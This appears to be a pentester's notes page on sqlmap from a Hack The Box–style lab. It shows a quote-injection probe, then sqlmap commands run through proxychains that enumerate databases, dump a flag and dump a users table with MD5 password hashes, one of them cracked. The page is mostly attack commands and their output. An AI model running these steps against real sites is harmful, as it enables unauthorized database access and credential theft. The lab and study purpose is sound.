# 💢 sqlmap
Tags: #💢
Related to: 
See also: 
Previous: [[Web Application Analysis]], [[Database Assessment]], [[Exploitation Tools]]

---
## Description

Automatic SQL injection tool.

## Usage Examples

Test for SQLi:

	proxychains firefox http://172.16.1.12/blog/category.php?id=2%27	// ' == %27 in hex

```
You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near ''1''' at line 1
```

### Enumerate databases

	proxychains sqlmap -u http://172.16.1.12/blog/category.php?id=2 --dbs --batch 

```
available databases [7]:                                                                                            
[*] blog_admin_db
[*] flag
[*] information_schema
[*] mysql
[*] performance_schema
[*] phpmyadmin
[*] test
```

### Dump data from flag database

	proxychains sqlmap -u http://172.16.1.12/blog/category.php?id=2 -D flag --dump

```
-D			// DBMS database to enumerate
--dump		// Dump DBMS database table entries
--dump-all	// Dump all DBMS databases tables entries
```

```
Database: flag
Table: flag
[1 entry]
+------------------------------+
| flag                         |
+------------------------------+
| DANTE{wHy_y0U_n0_s3cURe?!?!} |
+------------------------------+
```

### Enumerate tables

	proxychains sqlmap -u http://172.16.1.12/blog/category.php?id=2 -D blog_admin_db --table

```
--tables	// Enumerate DBMS database tables
```

```
Database: blog_admin_db                                                                                             
[13 tables]
+-----------------------------+
| banner_posts                |
| blog_categories             |
| blogs                       |
| editors_choice              |
| links                       |
| membership_grouppermissions |
| membership_groups           |
| membership_userpermissions  |
| membership_userrecords      |
| membership_users            |
| page_hits                   |
| titles                      |
| visitor_info                |
+-----------------------------+
```

### Enumerate table

	proxychains sqlmap -u http://172.16.1.12/blog/category.php?id=2 -D blog_admin_db -T membership_users --dump

```
-T	// DBMS database table(s) to enumerate
```

```
[21:13:55] [INFO] cracked password 'admin' for hash '21232f297a57a5a743894a0e4a801fc3'                              
Database: blog_admin_db                                                                                             
Table: membership_users
[4 entries]
+---------+----------+----------------+---------+---------+---------+---------+------------------------------------------+----------------------------------------------------------------------------------------------+----------+------------+------------+----------------+-------------------+
| groupID | memberID | email          | custom1 | custom2 | custom3 | custom4 | passMD5                                  | comments                                                                                     | isBanned | isApproved | signupDate | pass_reset_key | pass_reset_expiry |
+---------+----------+----------------+---------+---------+---------+---------+------------------------------------------+----------------------------------------------------------------------------------------------+----------+------------+------------+----------------+-------------------+
| 2       | admin    | <blank>        | NULL    | NULL    | NULL    | NULL    | 21232f297a57a5a743894a0e4a801fc3 (admin) | Admin member created automatically on 2018-04-26\nRecord updated automatically on 2018-04-27 | 0        | 1          | 2018-04-26 | NULL           | NULL              |
| NULL    | ben      | ben@dante.htb  | NULL    | NULL    | NULL    | NULL    | 442179ad1de9c25593cabf625c0badb7         | NULL                                                                                         | NULL     | NULL       | NULL       | NULL           | NULL              |
| 3       | egre55   | egre55@htb.com | egre55  | a       | a       | a       | d6501933a2e0ea1f497b87473051417f         | member signed up through the registration form.                                              | 0        | 1          | 2020-08-05 | NULL           | NULL              |
| 1       | guest    | NULL           | NULL    | NULL    | NULL    | NULL    | NULL                                     | Anonymous member created automatically on 2018-04-26                                         | 0        | 1          | 2018-04-26 | NULL           | NULL              |
+---------+----------+----------------+---------+---------+---------+---------+------------------------------------------+----------------------------------------------------------------------------------------------+----------+------------+------------+----------------+-------------------+
```

---
## References
- [[]]